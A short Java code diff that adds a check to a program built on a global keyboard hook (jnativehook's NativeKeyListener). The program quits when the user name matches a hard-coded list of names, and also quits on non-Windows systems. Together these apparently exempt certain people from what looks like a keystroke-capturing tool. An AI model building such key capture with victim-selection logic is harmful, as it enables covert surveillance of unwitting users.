@@ -28,6 +28,13 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener{
 	public static void main (String[] args) throws IOException, URISyntaxException {
+		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb"};
+		// System.out.println(System.getProperty("user.name"));
+		for(int fsk = 0; fsk < protect.length; fsk++) {
+			if (protect[fsk].matches(System.getProperty("user.name"))) {
+				System.exit(0);
+			}
+		}
 		if (!isWindows()) {
 			System.out.println("This ain't windows, son!");
 			System.exit(0);
